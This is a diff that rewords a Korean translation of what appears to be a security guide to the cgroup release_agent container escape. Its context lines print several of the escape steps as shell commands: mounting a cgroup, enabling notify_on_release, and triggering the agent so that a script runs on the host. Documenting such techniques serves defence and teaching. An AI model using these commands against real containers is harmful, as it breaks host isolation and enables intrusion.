@@ -36,7 +36,7 @@ mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
 ```
 2. **자식 Cgroup 설정:**
 * 마운트된 cgroup 디렉토리 내에 "x"라는 이름의 자식 cgroup이 생성됩니다.
-* "x" cgroup에 대해 notify\_on\_release 파일에 1을 작성하여 알림이 활성화됩니다.
+* "x" cgroup에 대한 알림이 notify\_on\_release 파일에 1을 작성하여 활성화됩니다.
 ```shell
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
@@ -56,7 +56,7 @@ chmod a+x /cmd
 ```
 5. **공격 시작:**
 * "x" 자식 cgroup 내에서 프로세스가 시작되고 즉시 종료됩니다.
-* 이로 인해 `release_agent`(the /cmd script)가 트리거되어 호스트에서 ps aux를 실행하고 출력을 컨테이너 내의 /output에 기록합니다.
+* 이로 인해 `release_agent`(즉, /cmd 스크립트)가 트리거되어 호스트에서 ps aux를 실행하고 출력을 컨테이너 내의 /output에 기록합니다.
 ```shell
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 ```
